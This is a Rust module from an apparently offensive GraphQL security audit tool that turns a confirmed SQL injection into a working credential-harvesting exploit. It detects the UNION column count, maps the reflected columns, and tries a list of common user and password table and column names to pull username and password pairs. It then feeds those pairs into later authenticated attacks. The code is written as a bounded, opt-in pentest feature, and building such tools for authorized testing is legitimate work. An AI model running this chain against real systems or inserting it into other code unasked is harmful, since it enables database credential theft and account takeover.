//! Auto-chain: on a **confirmed** SQL injection, make a best-effort attempt to extract credentials
//! (a bounded UNION-based dump of a users table) so the audit can feed recovered username/password
//! pairs into later probes as seeds — unlocking auth-gated sinks (e.g. an admin-gated command
//! injection) without the operator supplying `--seeds` by hand.
//!
//! This is heuristic, not a full SQLi engine: it works against lax databases (SQLite/MySQL/Postgres)
//! where the injectable field returns readable string columns and the schema uses conventional
//! table/column names. It is bounded (~40 requests) and only runs under the explicit `--chain` flag.

use crate::audit::utils::{effective_headers, find_root_field};
use crate::config::AppConfig;
use crate::transport::Transport;
use crate::types::{AffectedLocation, Finding, GqlField, GqlSchema};
use reqwest::Client;

const MAX_COLUMNS: usize = 12;

/// Mask a recovered secret for display (keep first/last char), so a shared report doesn't leak the
/// full plaintext password even though the tool used it internally.
pub fn mask_secret(s: &str) -> String {
    let n = s.chars().count();
    match n {
        0 => String::new(),
        1..=2 => "*".repeat(n),
        _ => {
            let first = s.chars().next().unwrap();
            let last = s.chars().last().unwrap();
            format!("{}{}{}", first, "*".repeat(n - 2), last)
        }
    }
}

/// Prioritised `(table, user_column, password_column)` guesses, most common first. Kept short so the
/// whole chain stays within a small request budget.
const CRED_CANDIDATES: &[(&str, &str, &str)] = &[
    ("users", "username", "password"),
    ("users", "email", "password"),
    ("users", "username", "passwd"),
    ("user", "username", "password"),
    ("user", "email", "password"),
    ("accounts", "username", "password"),
    ("accounts", "email", "password"),
    ("members", "username", "password"),
    ("admin", "username", "password"),
    ("users", "user", "pass"),
    ("users", "login", "password"),
    ("credentials", "username", "password"),
    ("users", "name", "password"),
    ("users", "username", "hash"),
    ("users", "username", "pwd"),
];

/// Attempt credential extraction from any confirmed SQLi. Returns recovered `(username, password)`
/// pairs (may be empty). Read-only for the app's data model — it only issues `SELECT`/`UNION` reads.
#[allow(clippy::too_many_arguments)]
pub async fn harvest_credentials(
    schema: &GqlSchema,
    url: &str,
    client: &Client,
    extra_headers: &[String],
    rate_limit_ms: u64,
    evasion_level: u8,
    transport: Transport,
    config: &AppConfig,
    confirmed: &[Finding],
) -> Vec<(String, String)> {
    let headers = effective_headers(extra_headers, None, false);

    // Find a confirmed SQLi whose field returns an object with readable string columns to exfil into.
    for finding in confirmed
        .iter()
        .filter(|f| f.id == "sql-injection" || f.id == "sql-injection-inline")
    {
        for loc in &finding.affected {
            let AffectedLocation::Argument(root, field_name, path) = loc else {
                continue;
            };
            let op_kw = if root == "Mutation" { "mutation" } else { "query" };
            let Some(field) = find_root_field(schema, root.as_str(), field_name.as_str()) else {
                continue;
            };
            // We inject into a top-level **String** scalar argument (UNION exfil needs a string
            // breakout); skip nested input-object paths and non-string args.
            let arg_name = path.as_str();
            let is_string_arg = field
                .args
                .as_ref()
                .and_then(|a| a.iter().find(|x| x.name == arg_name))
                .and_then(|a| a.arg_type.as_ref())
                .and_then(|t| t.unwrap_type_name())
                .as_deref()
                == Some("String");
            if !is_string_arg {
                continue;
            }
            let out_fields = string_output_fields(schema, field);
            if out_fields.is_empty() {
                continue; // nowhere to read exfiltrated strings from
            }

            if let Some(creds) = extract_from(
                schema, url, client, &headers, rate_limit_ms, evasion_level, transport, config, op_kw,
                field, arg_name, &out_fields,
            )
            .await
            {
                if !creds.is_empty() {
                    return creds;
                }
            }
        }
    }
    Vec::new()
}

/// The per-location extraction: discover column count, map an exfil column, then brute the
/// `(table, user, pass)` matrix reading `user || ':' || pass` back out of the response.
#[allow(clippy::too_many_arguments)]
async fn extract_from(
    schema: &GqlSchema,
    url: &str,
    client: &Client,
    headers: &[(String, String)],
    rate_limit_ms: u64,
    evasion_level: u8,
    transport: Transport,
    config: &AppConfig,
    op_kw: &str,
    field: &GqlField,
    arg_name: &str,
    out_fields: &[String],
) -> Option<Vec<(String, String)>> {
    let run = |payload: String| {
        run_injection(
            schema, url, client, headers, rate_limit_ms, evasion_level, transport, config, op_kw,
            field, arg_name, payload, out_fields,
        )
    };

    // 1. Column count: first `k` UNION NULLs that the server accepts without a SQL error.
    let mut ncols = 0usize;
    for k in 1..=MAX_COLUMNS {
        let nulls = vec!["NULL"; k].join(",");
        let resp = run(format!("zzintro{} UNION SELECT {}-- -", "\u{27}", nulls)).await?;
        if resp.errors_text.is_empty() && resp.data.is_some() {
            ncols = k;
            break;
        }
    }
    if ncols == 0 {
        return None;
    }

    // 2. Map exfil columns: mark every column and see which string output field reflects which
    //    UNION column index.
    let markers: Vec<String> = (0..ncols).map(|i| format!("'INJCOL{}'", i)).collect();
    let resp = run(format!("zzintro{} UNION SELECT {}-- -", "\u{27}", markers.join(","))).await?;
    let mapped = find_marker_columns(&resp.data, out_fields); // [(field, col_index), …]
    if mapped.is_empty() {
        return None;
    }

    // 3. Brute credential table/columns. Non-target columns get a non-null placeholder (`1`) so a
    //    non-null column (e.g. an integer primary key) doesn't null the whole row; username and
    //    password go into two mapped string columns (or a `user||':'||pass` concat if only one).
    for (table, ucol, pcol) in CRED_CANDIDATES {
        let mut cols = vec!["1".to_string(); ncols];
        let two_col = mapped.len() >= 2;
        if two_col {
            cols[mapped[0].1] = (*ucol).to_string();
            cols[mapped[1].1] = (*pcol).to_string();
        } else {
            cols[mapped[0].1] = format!("{}||':'||{}", ucol, pcol);
        }
        let payload = format!("zzintro{} UNION SELECT {} FROM {}-- -", "\u{27}", cols.join(","), table);
        let resp = run(payload).await?;
        if !resp.errors_text.is_empty() {
            continue;
        }
        let pairs = if two_col {
            read_pairs_two(&resp.data, &mapped[0].0, &mapped[1].0)
        } else {
            read_pairs_concat(&resp.data, &mapped[0].0)
        };
        if !pairs.is_empty() {
            return Some(pairs);
        }
    }
    None
}

/// Issue one injection request: fill the injectable arg with `payload` (other args defaulted), and
/// replace the generated `{ __typename }` selection with the readable string fields.
#[allow(clippy::too_many_arguments)]
async fn run_injection(
    schema: &GqlSchema,
    url: &str,
    client: &Client,
    headers: &[(String, String)],
    rate_limit_ms: u64,
    evasion_level: u8,
    transport: Transport,
    config: &AppConfig,
    op_kw: &str,
    field: &GqlField,
    arg_name: &str,
    payload: String,
    out_fields: &[String],
) -> Option<crate::audit::utils::ProbeResponse> {
    // Build a query that sets ONLY the injectable arg (via a `$v` String variable) plus any
    // *required* sibling args (default literals). Omitting optional args is critical: filling them
    // can make the backend append clauses (e.g. `LIMIT ? OFFSET ?`) that our `-- -` comment breaks,
    // causing a bind-parameter mismatch that silently fails the UNION.
    let mut arg_parts = vec![format!("{}: $v", arg_name)];
    if let Some(args) = &field.args {
        for arg in args {
            if arg.name == arg_name {
                continue;
            }
            let required = arg
                .arg_type
                .as_ref()
                .map(|t| t.kind.as_deref() == Some("NON_NULL"))
                .unwrap_or(false);
            if required {
                if let Some(tr) = &arg.arg_type {
                    let lit = crate::audit::utils::resolve_complex_default(
                        schema, tr, &arg.name, 0, std::collections::HashSet::new(), &config.audit.seeds,
                    );
                    arg_parts.push(format!("{}: {}", arg.name, lit));
                }
            }
        }
    }
    let query = format!(
        "{} Introspectre_chain($v: String) {{ {}({}) {{ {} }} }}",
        op_kw,
        field.name,
        arg_parts.join(", "),
        out_fields.join(" ")
    );
    let variables = serde_json::json!({ "v": payload });
    crate::audit::utils::post_graphql_ext(
        client, url, headers, &query, Some(variables), rate_limit_ms, evasion_level, transport,
        op_kw == "mutation",
    )
    .await
    .ok()
}

/// The String scalar output fields of a field's return object type (a place to read exfil'd data).
fn string_output_fields(schema: &GqlSchema, field: &GqlField) -> Vec<String> {
    let Some(type_name) = field.field_type.as_ref().and_then(|t| t.unwrap_type_name()) else {
        return Vec::new();
    };
    let Some(gql_type) = schema.find_type(&type_name) else {
        return Vec::new();
    };
    let Some(fields) = &gql_type.fields else {
        return Vec::new();
    };
    fields
        .iter()
        .filter(|f| {
            f.field_type
                .as_ref()
                .and_then(|t| t.unwrap_type_name())
                .as_deref()
                == Some("String")
                && f.args.as_ref().map(|a| a.is_empty()).unwrap_or(true)
        })
        .map(|f| f.name.clone())
        .take(6)
        .collect()
}

/// From a marker response, map each output field to the UNION column index it reads (via the
/// `INJCOL{n}` marker it shows). Returns `[(field, col_index), …]` for the string columns.
fn find_marker_columns(data: &Option<serde_json::Value>, out_fields: &[String]) -> Vec<(String, usize)> {
    let mut mapped: Vec<(String, usize)> = Vec::new();
    for item in items(data) {
        for f in out_fields {
            if let Some(s) = item.get(f).and_then(|v| v.as_str()) {
                if let Some(idx) = s.strip_prefix("INJCOL").and_then(|n| n.parse::<usize>().ok()) {
                    if !mapped.iter().any(|(mf, _)| mf == f) {
                        mapped.push((f.clone(), idx));
                    }
                }
            }
        }
        if !mapped.is_empty() {
            break; // one marker row is enough to learn the mapping
        }
    }
    mapped
}

/// Read `(username, password)` pairs from two separate mapped string fields.
fn read_pairs_two(data: &Option<serde_json::Value>, ufield: &str, pfield: &str) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = Vec::new();
    for item in items(data) {
        let u = item.get(ufield).and_then(|v| v.as_str());
        let p = item.get(pfield).and_then(|v| v.as_str());
        if let (Some(u), Some(p)) = (u, p) {
            if !u.is_empty() && !out.iter().any(|(eu, _)| eu == u) {
                out.push((u.to_string(), p.to_string()));
            }
        }
    }
    out
}

/// Read `user:pass` values out of a single mapped concat field across all returned rows.
fn read_pairs_concat(data: &Option<serde_json::Value>, exfil_field: &str) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = Vec::new();
    for item in items(data) {
        if let Some(s) = item.get(exfil_field).and_then(|v| v.as_str()) {
            if let Some((u, p)) = s.split_once(':') {
                if !u.is_empty() && !out.iter().any(|(eu, _)| eu == u) {
                    out.push((u.to_string(), p.to_string()));
                }
            }
        }
    }
    out
}

/// Normalise a response's `data.<field>` into an iterable of row objects (handles list vs single).
fn items(data: &Option<serde_json::Value>) -> Vec<serde_json::Value> {
    let Some(obj) = data.as_ref().and_then(|d| d.as_object()) else {
        return Vec::new();
    };
    // The field is the sole top-level key; collect object rows from a list or a single object.
    for (_k, v) in obj {
        match v {
            serde_json::Value::Array(a) => {
                return a.iter().filter(|x| x.is_object()).cloned().collect();
            }
            serde_json::Value::Object(_) => return vec![v.clone()],
            _ => {}
        }
    }
    Vec::new()
}
